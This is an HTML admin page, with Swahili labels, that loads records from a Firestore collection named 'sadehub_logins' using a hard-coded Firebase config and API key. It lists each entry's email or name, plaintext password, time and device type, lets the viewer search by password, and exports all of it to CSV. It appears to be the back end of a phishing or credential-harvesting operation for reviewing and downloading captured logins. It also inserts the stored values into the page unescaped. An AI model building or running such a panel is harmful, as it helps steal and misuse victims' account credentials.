<!DOCTYPE html>
<html lang="sw">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Logins Admin</title>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
    import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCq0QQbxa4QkmaxTh8QCaJ1EN_ORkKNWPE",
      authDomain: "world-technology-4d429.firebaseapp.com",
      projectId: "world-technology-4d429",
      storageBucket: "world-technology-4d429.firebasestorage.app",
      messagingSenderId: "979647621854",
      appId: "1:979647621854:web:d74e648bf93ad6c671704f"
    };

    const COLLECTION_NAME = "sadehub_logins";

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    let allData = [];

    function formatDate(val) {
      if (!val) return '—';
      if (val.toDate) return val.toDate().toLocaleString('sw-KE');
      if (typeof val === 'string' || typeof val === 'number') return new Date(val).toLocaleString('sw-KE');
      return String(val);
    }

    async function loadData() {
      const loading = document.getElementById('loading');
      const content = document.getElementById('content');
      const errorEl = document.getElementById('error-msg');
      loading.style.display = 'flex';
      content.style.display = 'none';
      errorEl.style.display = 'none';
      try {
        const snap = await getDocs(collection(db, COLLECTION_NAME));
        allData = [];
        snap.forEach(doc => allData.push({ id: doc.id, ...doc.data() }));
        loading.style.display = 'none';
        content.style.display = 'block';
        renderTable(allData);
        updateCount(allData.length);
      } catch(err) {
        loading.style.display = 'none';
        errorEl.style.display = 'block';
        errorEl.textContent = '⚠️ ' + err.message;
      }
    }

    function updateCount(n) {
      document.getElementById('count').textContent = 'Jumla: ' + n + ' rekodi';
    }

    function renderTable(data) {
      const tbody = document.getElementById('tbody');
      tbody.innerHTML = '';
      if (!data.length) {
        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:2rem;color:#888">Hakuna rekodi</td></tr>';
        return;
      }
      data.forEach((d, i) => {
        const ts = d.tarehe || d.createdAt || d.timestamp || d.wakati;
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td><span class="num">${i+1}</span></td>
          <td>${d.email || d.jina || d.name || '—'}</td>
          <td>${d.password || d.pass || '—'}</td>
          <td class="date">${formatDate(ts)}</td>
          <td>${d.aina_ya_simu || d.phone_type || d.kifaa || d.device || '—'}</td>
        `;
        tbody.appendChild(tr);
      });
    }

    function exportCSV() {
      const rows = [['#','Email/Jina','Password','Wakati','Kifaa']];
      allData.forEach((d, i) => {
        const ts = d.tarehe || d.createdAt || d.timestamp || d.wakati;
        rows.push([
          i+1,
          d.email || d.jina || d.name || '',
          d.password || d.pass || '',
          formatDate(ts),
          d.aina_ya_simu || d.phone_type || d.kifaa || d.device || ''
        ]);
      });
      const csv = rows.map(r => r.map(v => `"${String(v).replace(/"/g,'""')}"`).join(',')).join('\n');
      const a = document.createElement('a');
      a.href = URL.createObjectURL(new Blob([csv], {type:'text/csv'}));
      a.download = 'logins-' + new Date().toISOString().slice(0,10) + '.csv';
      a.click();
    }

    window.addEventListener('DOMContentLoaded', () => {
      loadData();
      document.getElementById('export-btn').onclick = exportCSV;
      document.getElementById('refresh-btn').onclick = loadData;
      document.getElementById('search').addEventListener('input', e => {
        const q = e.target.value.toLowerCase();
        const filtered = allData.filter(d =>
          (d.email||d.jina||'').toLowerCase().includes(q) ||
          (d.password||d.pass||'').toLowerCase().includes(q) ||
          (d.aina_ya_simu||d.kifaa||'').toLowerCase().includes(q)
        );
        renderTable(filtered);
        updateCount(filtered.length);
      });
    });
  </script>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #111;
      color: #ddd;
      font-family: Arial, sans-serif;
      font-size: 14px;
    }

    .top-bar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 14px 16px 4px;
      flex-wrap: wrap;
      gap: 8px;
    }

    .title-group h2 {
      font-size: 1rem;
      font-weight: bold;
      color: #fff;
    }
    .title-group .count {
      font-size: 0.75rem;
      color: #888;
      margin-top: 2px;
    }

    .actions { display: flex; gap: 8px; align-items: center; }

    input[type=text] {
      background: #222;
      border: 1px solid #333;
      color: #ddd;
      border-radius: 5px;
      padding: 5px 10px;
      font-size: 0.8rem;
      outline: none;
      width: 160px;
    }
    input[type=text]:focus { border-color: #1a6fc4; }

    button {
      border: none;
      cursor: pointer;
      border-radius: 5px;
      font-size: 0.8rem;
      font-weight: bold;
      padding: 6px 14px;
    }
    .btn-csv { background: #28a745; color: #fff; }
    .btn-csv:hover { background: #218838; }
    .btn-refresh { background: #444; color: #fff; }
    .btn-refresh:hover { background: #555; }

    .table-wrap { overflow-x: auto; padding: 0 0 20px; }

    table { width: 100%; border-collapse: collapse; }

    thead tr { background: #1a6fc4; }
    thead th {
      padding: 10px 10px;
      text-align: left;
      font-size: 0.8rem;
      color: #fff;
      white-space: nowrap;
    }

    tbody tr:nth-child(odd)  { background: #161616; }
    tbody tr:nth-child(even) { background: #1c1c1c; }
    tbody tr:hover { background: #1e3a5f; }

    td {
      padding: 8px 10px;
      font-size: 0.82rem;
      vertical-align: middle;
      border-bottom: 1px solid #222;
      word-break: break-all;
    }

    .num {
      display: inline-block;
      background: #2a2a2a;
      border-radius: 4px;
      padding: 1px 7px;
      font-size: 0.72rem;
      color: #aaa;
    }
    .date { color: #aaa; font-size: 0.78rem; white-space: nowrap; }

    #loading {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 4rem;
      gap: 12px;
      color: #888;
    }
    .spinner {
      width: 34px; height: 34px;
      border: 3px solid #333;
      border-top-color: #1a6fc4;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    #error-msg {
      display: none;
      margin: 12px 16px;
      background: rgba(200,50,50,0.15);
      border: 1px solid #c03;
      color: #f88;
      border-radius: 6px;
      padding: 10px 14px;
      font-size: 0.85rem;
    }
  </style>
</head>
<body>

  <div class="top-bar">
    <div class="title-group">
      <h2>📋 Logins</h2>
      <div class="count" id="count">Inapakia...</div>
    </div>
    <div class="actions">
      <input type="text" id="search" placeholder="Tafuta..."/>
      <button class="btn-csv" id="export-btn">↓ CSV</button>
      <button class="btn-refresh" id="refresh-btn">↻ Refresh</button>
    </div>
  </div>

  <div id="error-msg"></div>

  <div id="loading">
    <div class="spinner"></div>
    <span>Inapakia...</span>
  </div>

  <div id="content" style="display:none">
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>#</th>
            <th>Taarifa (Email / Jina / Simu)</th>
            <th>Password</th>
            <th>Wakati</th>
            <th>Kifaa</th>
          </tr>
        </thead>
        <tbody id="tbody"></tbody>
      </table>
    </div>
  </div>

</body>
</html>
